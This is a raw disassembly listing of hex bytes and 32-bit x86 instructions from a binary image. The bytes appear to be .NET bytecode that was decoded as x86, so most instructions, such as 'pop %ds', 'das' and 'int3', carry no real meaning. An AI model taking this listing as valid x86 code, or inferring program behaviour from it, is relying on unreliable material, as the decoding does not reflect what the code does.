1000465f:	00 00                	add    %al,(%eax)
10004661:	04 11                	add    $0x11,%al
10004663:	34 16                	xor    $0x16,%al
10004665:	7d 28                	jge    0x1000468f
10004667:	00 00                	add    %al,(%eax)
10004669:	04 11                	add    $0x11,%al
1000466b:	34 16                	xor    $0x16,%al
1000466d:	7d 29                	jge    0x10004698
1000466f:	00 00                	add    %al,(%eax)
10004671:	04 73                	add    $0x73,%al
10004673:	69 00 00 0a 13 11    	imul   $0x11130a00,(%eax),%eax
10004679:	11 11                	adc    %edx,(%ecx)
1000467b:	1f                   	pop    %ds
1000467c:	32 6f 6a             	xor    0x6a(%edi),%ch
1000467f:	00 00                	add    %al,(%eax)
10004681:	0a 11                	or     (%ecx),%dl
10004683:	11 11                	adc    %edx,(%ecx)
10004685:	34 fe                	xor    $0xfe,%al
10004687:	06                   	push   %es
10004688:	47                   	inc    %edi
10004689:	00 00                	add    %al,(%eax)
1000468b:	06                   	push   %es
1000468c:	73 6b                	jae    0x100046f9
1000468e:	00 00                	add    %al,(%eax)
10004690:	0a 6f 6c             	or     0x6c(%edi),%ch
10004693:	00 00                	add    %al,(%eax)
10004695:	0a 11                	or     (%ecx),%dl
10004697:	11 6f 6d             	adc    %ebp,0x6d(%edi)
1000469a:	00 00                	add    %al,(%eax)
1000469c:	0a 38                	or     (%eax),%bh
1000469e:	26 0e                	es push %cs
100046a0:	00 00                	add    %al,(%eax)
100046a2:	72 01                	jb     0x100046a5
100046a4:	00 00                	add    %al,(%eax)
100046a6:	70 13                	jo     0x100046bb
100046a8:	12 28                	adc    (%eax),%ch
100046aa:	5f                   	pop    %edi
100046ab:	00 00                	add    %al,(%eax)
100046ad:	0a 13                	or     (%ebx),%dl
100046af:	13 28                	adc    (%eax),%ebp
100046b1:	5f                   	pop    %edi
100046b2:	00 00                	add    %al,(%eax)
100046b4:	0a 13                	or     (%ebx),%dl
100046b6:	14 11                	adc    $0x11,%al
100046b8:	34 28                	xor    $0x28,%al
100046ba:	5f                   	pop    %edi
100046bb:	00 00                	add    %al,(%eax)
100046bd:	0a 7d 2a             	or     0x2a(%ebp),%bh
100046c0:	00 00                	add    %al,(%eax)
100046c2:	04 28                	add    $0x28,%al
100046c4:	5f                   	pop    %edi
100046c5:	00 00                	add    %al,(%eax)
100046c7:	0a 13                	or     (%ebx),%dl
100046c9:	15 7e 12 00 00       	adc    $0x127e,%eax
100046ce:	04 13                	add    $0x13,%al
100046d0:	3c 11                	cmp    $0x11,%al
100046d2:	3c 1f                	cmp    $0x1f,%al
100046d4:	0b 59 45             	or     0x45(%ecx),%ebx
100046d7:	05 00 00 00 05       	add    $0x5000000,%eax
100046dc:	00 00                	add    %al,(%eax)
100046de:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
100046e2:	00 9d 00 00 00 e6    	add    %bl,-0x1a000000(%ebp)
100046e8:	00 00                	add    %al,(%eax)
100046ea:	00 33                	add    %dh,(%ebx)
100046ec:	01 00                	add    %eax,(%eax)
100046ee:	00 38                	add    %bh,(%eax)
100046f0:	7a 01                	jp     0x100046f3
100046f2:	00 00                	add    %al,(%eax)
100046f4:	72 dd                	jb     0x100046d3
100046f6:	04 00                	add    $0x0,%al
100046f8:	70 13                	jo     0x1000470d
100046fa:	12 20                	adc    (%eax),%ah
100046fc:	ec                   	in     (%dx),%al
100046fd:	00 00                	add    %al,(%eax)
100046ff:	00 1f                	add    %bl,(%edi)
10004701:	70 16                	jo     0x10004719
10004703:	28 39                	sub    %bh,(%ecx)
10004705:	00 00                	add    %al,(%eax)
10004707:	0a 13                	or     (%ebx),%dl
10004709:	13 16                	adc    (%esi),%edx
1000470b:	1f                   	pop    %ds
1000470c:	36 1f                	ss pop %ds
1000470e:	41                   	inc    %ecx
1000470f:	28 39                	sub    %bh,(%ecx)
10004711:	00 00                	add    %al,(%eax)
10004713:	0a 13                	or     (%ebx),%dl
10004715:	14 11                	adc    $0x11,%al
10004717:	34 20                	xor    $0x20,%al
10004719:	ec                   	in     (%dx),%al
1000471a:	00 00                	add    %al,(%eax)
1000471c:	00 1f                	add    %bl,(%edi)
1000471e:	70 16                	jo     0x10004736
10004720:	28 39                	sub    %bh,(%ecx)
10004722:	00 00                	add    %al,(%eax)
10004724:	0a 7d 2a             	or     0x2a(%ebp),%bh
10004727:	00 00                	add    %al,(%eax)
10004729:	04 16                	add    $0x16,%al
1000472b:	1f                   	pop    %ds
1000472c:	36 1f                	ss pop %ds
1000472e:	41                   	inc    %ecx
1000472f:	28 39                	sub    %bh,(%ecx)
10004731:	00 00                	add    %al,(%eax)
10004733:	0a 13                	or     (%ebx),%dl
10004735:	15 38 33 01 00       	adc    $0x13338,%eax
1000473a:	00 72 e7             	add    %dh,-0x19(%edx)
1000473d:	04 00                	add    $0x0,%al
1000473f:	70 13                	jo     0x10004754
10004741:	12 20                	adc    (%eax),%ah
10004743:	cc                   	int3
10004744:	00 00                	add    %al,(%eax)
10004746:	00 1f                	add    %bl,(%edi)
10004748:	09 1f                	or     %ebx,(%edi)
1000474a:	2f                   	das
1000474b:	28 39                	sub    %bh,(%ecx)
1000474d:	00 00                	add    %al,(%eax)
1000474f:	0a 13                	or     (%ebx),%dl
10004751:	13 20                	adc    (%eax),%esp
10004753:	cc                   	int3
10004754:	00 00                	add    %al,(%eax)
10004756:	00 1f                	add    %bl,(%edi)
10004758:	09 1f                	or     %ebx,(%edi)
1000475a:	2f                   	das
1000475b:	28 39                	sub    %bh,(%ecx)
1000475d:	00 00                	add    %al,(%eax)
1000475f:	0a 13                	or     (%ebx),%dl
10004761:	14 11                	adc    $0x11,%al
10004763:	34 20                	xor    $0x20,%al
10004765:	cc                   	int3
10004766:	00 00                	add    %al,(%eax)
10004768:	00 1f                	add    %bl,(%edi)
1000476a:	09 1f                	or     %ebx,(%edi)
1000476c:	2f                   	das
1000476d:	28 39                	sub    %bh,(%ecx)
1000476f:	00 00                	add    %al,(%eax)
10004771:	0a 7d 2a             	or     0x2a(%ebp),%bh
10004774:	00 00                	add    %al,(%eax)
10004776:	04 20                	add    $0x20,%al
10004778:	cc                   	int3
10004779:	00 00                	add    %al,(%eax)
1000477b:	00 1f                	add    %bl,(%edi)
1000477d:	09 1f                	or     %ebx,(%edi)
1000477f:	2f                   	das
10004780:	28 39                	sub    %bh,(%ecx)
10004782:	00 00                	add    %al,(%eax)
10004784:	0a 13                	or     (%ebx),%dl
10004786:	15 38 e2 00 00       	adc    $0xe238,%eax
1000478b:	00 72 f9             	add    %dh,-0x7(%edx)
1000478e:	04 00                	add    $0x0,%al
10004790:	70 13                	jo     0x100047a5
10004792:	12 20                	adc    (%eax),%ah
10004794:	ec                   	in     (%dx),%al
10004795:	00 00                	add    %al,(%eax)
10004797:	00 16                	add    %dl,(%esi)
10004799:	16                   	push   %ss
1000479a:	28 39                	sub    %bh,(%ecx)
1000479c:	00 00                	add    %al,(%eax)
1000479e:	0a 13                	or     (%ebx),%dl
100047a0:	13 20                	adc    (%eax),%esp
100047a2:	ec                   	in     (%dx),%al
100047a3:	00 00                	add    %al,(%eax)
100047a5:	00 16                	add    %dl,(%esi)
100047a7:	16                   	push   %ss
100047a8:	28 39                	sub    %bh,(%ecx)
100047aa:	00 00                	add    %al,(%eax)
100047ac:	0a 13                	or     (%ebx),%dl
100047ae:	14 11                	adc    $0x11,%al
100047b0:	34 20                	xor    $0x20,%al
100047b2:	ec                   	in     (%dx),%al
100047b3:	00 00                	add    %al,(%eax)
100047b5:	00 16                	add    %dl,(%esi)
100047b7:	16                   	push   %ss
100047b8:	28 39                	sub    %bh,(%ecx)
100047ba:	00 00                	add    %al,(%eax)
100047bc:	0a 7d 2a             	or     0x2a(%ebp),%bh
100047bf:	00 00                	add    %al,(%eax)
100047c1:	04 20                	add    $0x20,%al
100047c3:	ec                   	in     (%dx),%al
100047c4:	00 00                	add    %al,(%eax)
100047c6:	00 16                	add    %dl,(%esi)
100047c8:	16                   	push   %ss
100047c9:	28 39                	sub    %bh,(%ecx)
100047cb:	00 00                	add    %al,(%eax)
100047cd:	0a 13                	or     (%ebx),%dl
100047cf:	15 38 99 00 00       	adc    $0x9938,%eax
100047d4:	00 72 0d             	add    %dh,0xd(%edx)
100047d7:	05 00 70 13 12       	add    $0x12137000,%eax
100047dc:	20 ff                	and    %bh,%bh
100047de:	00 00                	add    %al,(%eax)
100047e0:	00 20                	add    %ah,(%eax)
100047e2:	ed                   	in     (%dx),%eax
100047e3:	00 00                	add    %al,(%eax)
100047e5:	00 16                	add    %dl,(%esi)
100047e7:	28 39                	sub    %bh,(%ecx)
100047e9:	00 00                	add    %al,(%eax)
100047eb:	0a 13                	or     (%ebx),%dl
100047ed:	13 16                	adc    (%esi),%edx
100047ef:	1f                   	pop    %ds
100047f0:	38 20                	cmp    %ah,(%eax)
100047f2:	82 00 00             	addb   $0x0,(%eax)
100047f5:	00 28                	add    %ch,(%eax)
100047f7:	39 00                	cmp    %eax,(%eax)
100047f9:	00 0a                	add    %cl,(%edx)
100047fb:	13 14 11             	adc    (%ecx,%edx,1),%edx
100047fe:	34 16                	xor    $0x16,%al
10004800:	1f                   	pop    %ds
10004801:	38 20                	cmp    %ah,(%eax)
10004803:	82 00 00             	addb   $0x0,(%eax)
10004806:	00 28                	add    %ch,(%eax)
10004808:	39 00                	cmp    %eax,(%eax)
1000480a:	00 0a                	add    %cl,(%edx)
1000480c:	7d 2a                	jge    0x10004838
1000480e:	00 00                	add    %al,(%eax)
10004810:	04 16                	add    $0x16,%al
10004812:	1f                   	pop    %ds
10004813:	38 20                	cmp    %ah,(%eax)
10004815:	82 00 00             	addb   $0x0,(%eax)
10004818:	00 28                	add    %ch,(%eax)
1000481a:	39 00                	cmp    %eax,(%eax)
1000481c:	00 0a                	add    %cl,(%edx)
1000481e:	13 15 2b 4c 72 0f    	adc    0xf724c2b,%edx
10004824:	08 00                	or     %al,(%eax)
10004826:	70 13                	jo     0x1000483b
10004828:	12 16                	adc    (%esi),%dl
1000482a:	1f                   	pop    %ds
1000482b:	66 20 b3 00 00 00 28 	data16 and %dh,0x28000000(%ebx)
10004832:	39 00                	cmp    %eax,(%eax)
10004834:	00 0a                	add    %cl,(%edx)
10004836:	13 13                	adc    (%ebx),%edx
10004838:	16                   	push   %ss
10004839:	1f                   	pop    %ds
1000483a:	66 20 b3 00 00 00 28 	data16 and %dh,0x28000000(%ebx)
10004841:	39 00                	cmp    %eax,(%eax)
10004843:	00 0a                	add    %cl,(%edx)
10004845:	13 14 11             	adc    (%ecx,%edx,1),%edx
10004848:	34 20                	xor    $0x20,%al
1000484a:	f7 00 00 00 20 90    	testl  $0x90200000,(%eax)
10004850:	00 00                	add    %al,(%eax)
10004852:	00 1f                	add    %bl,(%edi)
10004854:	1e                   	push   %ds
10004855:	28 39                	sub    %bh,(%ecx)
10004857:	00 00                	add    %al,(%eax)
10004859:	0a 7d 2a             	or     0x2a(%ebp),%bh
1000485c:	00 00                	add    %al,(%eax)
1000485e:	04 16                	add    $0x16,%al
10004860:	1f                   	pop    %ds
10004861:	66 20 b3 00 00 00 28 	data16 and %dh,0x28000000(%ebx)
10004868:	39 00                	cmp    %eax,(%eax)
1000486a:	00 0a                	add    %cl,(%edx)
1000486c:	13 15 7e 0e 00 00    	adc    0xe7e,%edx
10004872:	04 28                	add    $0x28,%al
10004874:	5f                   	pop    %edi
10004875:	00 00                	add    %al,(%eax)
10004877:	0a 6f 3a             	or     0x3a(%edi),%ch
1000487a:	00 00                	add    %al,(%eax)
1000487c:	0a 28                	or     (%eax),%ch
1000487e:	45                   	inc    %ebp
1000487f:	00 00                	add    %al,(%eax)
10004881:	0a 6f 46             	or     0x46(%edi),%ch
10004884:	00 00                	add    %al,(%eax)
10004886:	0a 13                	or     (%ebx),%dl
10004888:	16                   	push   %ss
10004889:	28 47 00             	sub    %al,0x0(%edi)
1000488c:	00 0a                	add    %cl,(%edx)
1000488e:	13 17                	adc    (%edi),%edx
10004890:	12 16                	adc    (%esi),%dl
10004892:	28 48 00             	sub    %cl,0x0(%eax)
10004895:	00 0a                	add    %cl,(%edx)
10004897:	12 17                	adc    (%edi),%dl
10004899:	28 48 00             	sub    %cl,0x0(%eax)
1000489c:	00 0a                	add    %cl,(%edx)
1000489e:	59                   	pop    %ecx
1000489f:	13 18                	adc    (%eax),%ebx
100048a1:	12 16                	adc    (%esi),%dl
100048a3:	28 49 00             	sub    %cl,0x0(%ecx)
100048a6:	00 0a                	add    %cl,(%edx)
100048a8:	12 17                	adc    (%edi),%dl
100048aa:	28 49 00             	sub    %cl,0x0(%ecx)
100048ad:	00 0a                	add    %cl,(%edx)
100048af:	59                   	pop    %ecx
100048b0:	13 19                	adc    (%ecx),%ebx
100048b2:	12 16                	adc    (%esi),%dl
100048b4:	28 4a 00             	sub    %cl,0x0(%edx)
100048b7:	00 0a                	add    %cl,(%edx)
100048b9:	13 1a                	adc    (%edx),%ebx
100048bb:	12 16                	adc    (%esi),%dl
100048bd:	28 4b 00             	sub    %cl,0x0(%ebx)
100048c0:	00 0a                	add    %cl,(%edx)
100048c2:	26 73 57             	es jae 0x1000491c
100048c5:	00 00                	add    %al,(%eax)
100048c7:	0a 13                	or     (%ebx),%dl
100048c9:	1b 11                	sbb    (%ecx),%edx
100048cb:	1b 11                	sbb    (%ecx),%edx
100048cd:	1a 1f                	sbb    (%edi),%bl
100048cf:	3c 73                	cmp    $0x73,%al
100048d1:	54                   	push   %esp
100048d2:	00 00                	add    %al,(%eax)
100048d4:	0a 6f 59             	or     0x59(%edi),%ch
100048d7:	00 00                	add    %al,(%eax)
100048d9:	0a 11                	or     (%ecx),%dl
100048db:	1b 11                	sbb    (%ecx),%edx
100048dd:	18 11                	sbb    %dl,(%ecx)
100048df:	19 73 52             	sbb    %esi,0x52(%ebx)
100048e2:	00 00                	add    %al,(%eax)
100048e4:	0a 6f 64             	or     0x64(%edi),%ch
100048e7:	00 00                	add    %al,(%eax)
100048e9:	0a 11                	or     (%ecx),%dl
100048eb:	1b 11                	sbb    (%ecx),%edx
100048ed:	15 6f 3a 00 00       	adc    $0x3a6f,%eax
100048f2:	0a 7e 0e             	or     0xe(%esi),%bh
100048f5:	00 00                	add    %al,(%eax)
100048f7:	04 6f                	add    $0x6f,%al
100048f9:	5d                   	pop    %ebp
100048fa:	00 00                	add    %al,(%eax)
100048fc:	0a 11                	or     (%ecx),%dl
100048fe:	1b 6f 5e             	sbb    0x5e(%edi),%ebp
10004901:	00 00                	add    %al,(%eax)
10004903:	0a 73 58             	or     0x58(%ebx),%dh
10004906:	00 00                	add    %al,(%eax)
10004908:	0a 13                	or     (%ebx),%dl
1000490a:	1c 11                	sbb    $0x11,%al
1000490c:	1c 11                	sbb    $0x11,%al
1000490e:	12 6f 35             	adc    0x35(%edi),%ch
10004911:	00 00                	add    %al,(%eax)
10004913:	0a 11                	or     (%ecx),%dl
10004915:	1c 72                	sbb    $0x72,%al
10004917:	35 02 00 70 22       	xor    $0x22700002,%eax
1000491c:	00 00                	add    %al,(%eax)
1000491e:	a0 41 17 73 65       	mov    0x65731741,%al
10004923:	00 00                	add    %al,(%eax)
10004925:	0a 6f 61             	or     0x61(%edi),%ch
10004928:	00 00                	add    %al,(%eax)
1000492a:	0a 11                	or     (%ecx),%dl
1000492c:	1c 7e                	sbb    $0x7e,%al
1000492e:	12 00                	adc    (%eax),%al
10004930:	00 04 1f             	add    %al,(%edi,%ebx,1)
10004933:	0e                   	push   %cs
10004934:	2e 07                	cs pop %es
10004936:	28 5f 00             	sub    %bl,0x0(%edi)
10004939:	00 0a                	add    %cl,(%edx)
1000493b:	2b 02                	sub    (%edx),%eax
1000493d:	11 13                	adc    %edx,(%ebx)
1000493f:	6f                   	outsl  %ds:(%esi),(%dx)
10004940:	3c 00                	cmp    $0x0,%al
10004942:	00 0a                	add    %cl,(%edx)
10004944:	11 1c 17             	adc    %ebx,(%edi,%edx,1)
10004947:	6f                   	outsl  %ds:(%esi),(%dx)
10004948:	62 00                	bound  %eax,(%eax)
1000494a:	00 0a                	add    %cl,(%edx)
1000494c:	11 1c 1f             	adc    %ebx,(%edi,%ebx,1)
1000494f:	19 1f                	sbb    %ebx,(%edi)
10004951:	0c 73                	or     $0x73,%al
10004953:	52                   	push   %edx
10004954:	00 00                	add    %al,(%eax)
10004956:	0a 6f 64             	or     0x64(%edi),%ch
10004959:	00 00                	add    %al,(%eax)
1000495b:	0a 11                	or     (%ecx),%dl
1000495d:	1c 28                	sbb    $0x28,%al
1000495f:	5a                   	pop    %edx
10004960:	00 00                	add    %al,(%eax)
10004962:	0a 6f 3a             	or     0x3a(%edi),%ch
10004965:	00 00                	add    %al,(%eax)
10004967:	0a 11                	or     (%ecx),%dl
10004969:	1b 6f 5d             	sbb    0x5d(%edi),%ebp
1000496c:	00 00                	add    %al,(%eax)
1000496e:	0a 11                	or     (%ecx),%dl
10004970:	1c 6f                	sbb    $0x6f,%al
10004972:	5e                   	pop    %esi
10004973:	00 00                	add    %al,(%eax)
10004975:	0a 73 58             	or     0x58(%ebx),%dh
10004978:	00 00                	add    %al,(%eax)
1000497a:	0a 13                	or     (%ebx),%dl
1000497c:	1d 11 1d 72 1b       	sbb    $0x1b721d11,%eax
10004981:	08 00                	or     %al,(%eax)
10004983:	70 6f                	jo     0x100049f4
10004985:	35 00 00 0a 11       	xor    $0x110a0000,%eax
1000498a:	1d 72 35 02 00       	sbb    $0x23572,%eax
1000498f:	70 22                	jo     0x100049b3
10004991:	00 00                	add    %al,(%eax)
10004993:	10 41 73             	adc    %al,0x73(%ecx)
10004996:	60                   	pusha
10004997:	00 00                	add    %al,(%eax)
10004999:	0a 6f 61             	or     0x61(%edi),%ch
1000499c:	00 00                	add    %al,(%eax)
1000499e:	0a 11                	or     (%ecx),%dl
100049a0:	1d 28 5f 00 00       	sbb    $0x5f28,%eax
100049a5:	0a 6f 3c             	or     0x3c(%edi),%ch
100049a8:	00 00                	add    %al,(%eax)
100049aa:	0a 11                	or     (%ecx),%dl
100049ac:	1d 1f 0a 20 bf       	sbb    $0xbf200a1f,%eax
100049b1:	00 00                	add    %al,(%eax)
100049b3:	00 20                	add    %ah,(%eax)
100049b5:	83 00 00             	addl   $0x0,(%eax)
100049b8:	00 28                	add    %ch,(%eax)
100049ba:	39 00                	cmp    %eax,(%eax)
100049bc:	00 0a                	add    %cl,(%edx)
100049be:	6f                   	outsl  %ds:(%esi),(%dx)
100049bf:	3a 00                	cmp    (%eax),%al
100049c1:	00 0a                	add    %cl,(%edx)
100049c3:	11 1d 17 6f 62 00    	adc    %ebx,0x626f17
100049c9:	00 0a                	add    %cl,(%edx)
100049cb:	11 1d 11 1a 20 96    	adc    %ebx,0x96201a11
100049d1:	00 00                	add    %al,(%eax)
100049d3:	00 59 1f             	add    %bl,0x1f(%ecx)
100049d6:	12 73 52             	adc    0x52(%ebx),%dh
100049d9:	00 00                	add    %al,(%eax)
100049db:	0a 6f 64             	or     0x64(%edi),%ch
100049de:	00 00                	add    %al,(%eax)
100049e0:	0a 11                	or     (%ecx),%dl
100049e2:	1b 6f 5d             	sbb    0x5d(%edi),%ebp
100049e5:	00 00                	add    %al,(%eax)
100049e7:	0a 11                	or     (%ecx),%dl
100049e9:	1d 6f 5e 00 00       	sbb    $0x5e6f,%eax
100049ee:	0a 73 57             	or     0x57(%ebx),%dh
100049f1:	00 00                	add    %al,(%eax)
100049f3:	0a 13                	or     (%ebx),%dl
100049f5:	1e                   	push   %ds
100049f6:	11 1e                	adc    %ebx,(%esi)
100049f8:	11 1a                	adc    %ebx,(%edx)
100049fa:	1f                   	pop    %ds
100049fb:	2d 73 54 00 00       	sub    $0x5473,%eax
10004a00:	0a 6f 59             	or     0x59(%edi),%ch
10004a03:	00 00                	add    %al,(%eax)
10004a05:	0a 11                	or     (%ecx),%dl
10004a07:	1e                   	push   %ds
10004a08:	11 18                	adc    %ebx,(%eax)
10004a0a:	11 19                	adc    %ebx,(%ecx)
10004a0c:	1f                   	pop    %ds
10004a0d:	3c 58                	cmp    $0x58,%al
10004a0f:	73 52                	jae    0x10004a63
10004a11:	00 00                	add    %al,(%eax)
10004a13:	0a 6f 64             	or     0x64(%edi),%ch
10004a16:	00 00                	add    %al,(%eax)
10004a18:	0a 11                	or     (%ecx),%dl
10004a1a:	1e                   	push   %ds
10004a1b:	11 13                	adc    %edx,(%ebx)
10004a1d:	6f                   	outsl  %ds:(%esi),(%dx)
10004a1e:	3a 00                	cmp    (%eax),%al
10004a20:	00 0a                	add    %cl,(%edx)
10004a22:	7e 0e                	jle    0x10004a32
10004a24:	00 00                	add    %al,(%eax)
10004a26:	04 6f                	add    $0x6f,%al
10004a28:	5d                   	pop    %ebp
10004a29:	00 00                	add    %al,(%eax)
10004a2b:	0a 11                	or     (%ecx),%dl
10004a2d:	1e                   	push   %ds
10004a2e:	6f                   	outsl  %ds:(%esi),(%dx)
10004a2f:	5e                   	pop    %esi
10004a30:	00 00                	add    %al,(%eax)
10004a32:	0a 73 58             	or     0x58(%ebx),%dh
10004a35:	00 00                	add    %al,(%eax)
10004a37:	0a 13                	or     (%ebx),%dl
10004a39:	1f                   	pop    %ds
10004a3a:	11 1f                	adc    %ebx,(%edi)
10004a3c:	1b 8d 11 00 00 01    	sbb    0x1000011(%ebp),%ecx
10004a42:	13 3b                	adc    (%ebx),%edi
10004a44:	11 3b                	adc    %edi,(%ebx)
10004a46:	16                   	push   %ss
10004a47:	72 3f                	jb     0x10004a88
10004a49:	08 00                	or     %al,(%eax)
10004a4b:	70 a2                	jo     0x100049ef
10004a4d:	11 3b                	adc    %edi,(%ebx)
10004a4f:	17                   	pop    %ss
10004a50:	28 67 00             	sub    %ah,0x0(%edi)
10004a53:	00 0a                	add    %cl,(%edx)
10004a55:	a2 11 3b 18 72       	mov    %al,0x72183b11
10004a5a:	49                   	dec    %ecx
10004a5b:	08 00                	or     %al,(%eax)
10004a5d:	70 a2                	jo     0x10004a01
10004a5f:	11 3b                	adc    %edi,(%ebx)
10004a61:	19 28                	sbb    %ebp,(%eax)
10004a63:	68 00 00 0a a2       	push   $0xa20a0000
10004a68:	11 3b                	adc    %edi,(%ebx)
10004a6a:	1a 72 69             	sbb    0x69(%edx),%dh
10004a6d:	08 00                	or     %al,(%eax)
10004a6f:	70 a2                	jo     0x10004a13
10004a71:	11 3b                	adc    %edi,(%ebx)
10004a73:	28 43 00             	sub    %al,0x0(%ebx)
10004a76:	00 0a                	add    %cl,(%edx)
10004a78:	6f                   	outsl  %ds:(%esi),(%dx)
10004a79:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10004a7e:	1f                   	pop    %ds
10004a7f:	72 35                	jb     0x10004ab6
10004a81:	02 00                	add    (%eax),%al
10004a83:	70 22                	jo     0x10004aa7
10004a85:	00 00                	add    %al,(%eax)
10004a87:	10 41 17             	adc    %al,0x17(%ecx)
10004a8a:	73 65                	jae    0x10004af1
10004a8c:	00 00                	add    %al,(%eax)
10004a8e:	0a 6f 61             	or     0x61(%edi),%ch
10004a91:	00 00                	add    %al,(%eax)
10004a93:	0a 11                	or     (%ecx),%dl
10004a95:	1f                   	pop    %ds
10004a96:	7e 12                	jle    0x10004aaa
10004a98:	00 00                	add    %al,(%eax)
10004a9a:	04 1f                	add    $0x1f,%al
10004a9c:	0e                   	push   %cs
10004a9d:	2e 07                	cs pop %es
10004a9f:	28 5f 00             	sub    %bl,0x0(%edi)
10004aa2:	00 0a                	add    %cl,(%edx)
10004aa4:	2b 02                	sub    (%edx),%eax
10004aa6:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
10004aa9:	3c 00                	cmp    $0x0,%al
10004aab:	00 0a                	add    %cl,(%edx)
10004aad:	11 1f                	adc    %ebx,(%edi)
10004aaf:	16                   	push   %ss
10004ab0:	6f                   	outsl  %ds:(%esi),(%dx)
10004ab1:	62 00                	bound  %eax,(%eax)
10004ab3:	00 0a                	add    %cl,(%edx)
10004ab5:	11 1f                	adc    %ebx,(%edi)
10004ab7:	11 1a                	adc    %ebx,(%edx)
10004ab9:	1f                   	pop    %ds
10004aba:	32 59 1f             	xor    0x1f(%ecx),%bl
10004abd:	23 73 54             	and    0x54(%ebx),%esi
10004ac0:	00 00                	add    %al,(%eax)
10004ac2:	0a 6f 59             	or     0x59(%edi),%ch
10004ac5:	00 00                	add    %al,(%eax)
10004ac7:	0a 11                	or     (%ecx),%dl
10004ac9:	1f                   	pop    %ds
10004aca:	1f                   	pop    %ds
10004acb:	19 1b                	sbb    %ebx,(%ebx)
10004acd:	73 52                	jae    0x10004b21
10004acf:	00 00                	add    %al,(%eax)
10004ad1:	0a 6f 64             	or     0x64(%edi),%ch
10004ad4:	00 00                	add    %al,(%eax)
10004ad6:	0a 11                	or     (%ecx),%dl
10004ad8:	1f                   	pop    %ds
10004ad9:	28 5a 00             	sub    %bl,0x0(%edx)
10004adc:	00 0a                	add    %cl,(%edx)
10004ade:	6f                   	outsl  %ds:(%esi),(%dx)
10004adf:	3a 00                	cmp    (%eax),%al
10004ae1:	00 0a                	add    %cl,(%edx)
10004ae3:	11 1e                	adc    %ebx,(%esi)
10004ae5:	6f                   	outsl  %ds:(%esi),(%dx)
10004ae6:	5d                   	pop    %ebp
10004ae7:	00 00                	add    %al,(%eax)
10004ae9:	0a 11                	or     (%ecx),%dl
10004aeb:	1f                   	pop    %ds
10004aec:	6f                   	outsl  %ds:(%esi),(%dx)
10004aed:	5e                   	pop    %esi
10004aee:	00 00                	add    %al,(%eax)
10004af0:	0a 73 58             	or     0x58(%ebx),%dh
10004af3:	00 00                	add    %al,(%eax)
10004af5:	0a 13                	or     (%ebx),%dl
10004af7:	20 11                	and    %dl,(%ecx)
10004af9:	20 72 14             	and    %dh,0x14(%edx)
10004afc:	09 00                	or     %eax,(%eax)
10004afe:	70 6f                	jo     0x10004b6f
10004b00:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10004b05:	20 72 f2             	and    %dh,-0xe(%edx)
10004b08:	03 00                	add    (%eax),%eax
10004b0a:	70 22                	jo     0x10004b2e
10004b0c:	00 00                	add    %al,(%eax)
10004b0e:	00 41 73             	add    %al,0x73(%ecx)
10004b11:	60                   	pusha
10004b12:	00 00                	add    %al,(%eax)
10004b14:	0a 6f 61             	or     0x61(%edi),%ch
10004b17:	00 00                	add    %al,(%eax)
10004b19:	0a 11                	or     (%ecx),%dl
10004b1b:	20 28                	and    %ch,(%eax)
10004b1d:	3d 00 00 0a 6f       	cmp    $0x6f0a0000,%eax
10004b22:	3c 00                	cmp    $0x0,%al
10004b24:	00 0a                	add    %cl,(%edx)
10004b26:	11 20                	adc    %esp,(%eax)
10004b28:	17                   	pop    %ss
10004b29:	6f                   	outsl  %ds:(%esi),(%dx)
10004b2a:	62 00                	bound  %eax,(%eax)
10004b2c:	00 0a                	add    %cl,(%edx)
10004b2e:	11 20                	adc    %esp,(%eax)
10004b30:	11 18                	adc    %ebx,(%eax)
10004b32:	1f                   	pop    %ds
10004b33:	19 58 11             	sbb    %ebx,0x11(%eax)
10004b36:	19 1f                	sbb    %ebx,(%edi)
10004b38:	70 58                	jo     0x10004b92
10004b3a:	73 52                	jae    0x10004b8e
10004b3c:	00 00                	add    %al,(%eax)
10004b3e:	0a 6f 64             	or     0x64(%edi),%ch
10004b41:	00 00                	add    %al,(%eax)
10004b43:	0a 11                	or     (%ecx),%dl
10004b45:	20 28                	and    %ch,(%eax)
10004b47:	5a                   	pop    %edx
10004b48:	00 00                	add    %al,(%eax)
10004b4a:	0a 6f 3a             	or     0x3a(%edi),%ch
10004b4d:	00 00                	add    %al,(%eax)
10004b4f:	0a 7e 0e             	or     0xe(%esi),%bh
10004b52:	00 00                	add    %al,(%eax)
10004b54:	04 6f                	add    $0x6f,%al
10004b56:	5d                   	pop    %ebp
10004b57:	00 00                	add    %al,(%eax)
10004b59:	0a 11                	or     (%ecx),%dl
10004b5b:	20 6f 5e             	and    %ch,0x5e(%edi)
10004b5e:	00 00                	add    %al,(%eax)
10004b60:	0a 11                	or     (%ecx),%dl
10004b62:	19 20                	sbb    %esp,(%eax)
10004b64:	8c 00                	mov    %es,(%eax)
10004b66:	00 00                	add    %al,(%eax)
10004b68:	58                   	pop    %eax
10004b69:	13 21                	adc    (%ecx),%esp
10004b6b:	1f                   	pop    %ds
10004b6c:	41                   	inc    %ecx
10004b6d:	13 22                	adc    (%edx),%esp
10004b6f:	1f                   	pop    %ds
10004b70:	1e                   	push   %ds
10004b71:	13 23                	adc    (%ebx),%esp
10004b73:	11 1a                	adc    %ebx,(%edx)
10004b75:	11 23                	adc    %esp,(%ebx)
10004b77:	18 5a 59             	sbb    %bl,0x59(%edx)
10004b7a:	13 24 1a             	adc    (%edx,%ebx,1),%esp
10004b7d:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
10004b80:	00 01                	add    %al,(%ecx)
10004b82:	13 25 11 34 1a 8d    	adc    0x8d1a3411,%esp
10004b88:	1c 00                	sbb    $0x0,%al
10004b8a:	00 01                	add    %al,(%ecx)
10004b8c:	7d 2b                	jge    0x10004bb9
10004b8e:	00 00                	add    %al,(%eax)
10004b90:	04 11                	add    $0x11,%al
10004b92:	34 1a                	xor    $0x1a,%al
10004b94:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
10004b97:	00 01                	add    %al,(%ecx)
10004b99:	7d 2c                	jge    0x10004bc7
10004b9b:	00 00                	add    %al,(%eax)
10004b9d:	04 11                	add    $0x11,%al
10004b9f:	34 1a                	xor    $0x1a,%al
10004ba1:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
10004ba4:	00 01                	add    %al,(%ecx)
10004ba6:	7d 2d                	jge    0x10004bd5
10004ba8:	00 00                	add    %al,(%eax)
10004baa:	04 11                	add    $0x11,%al
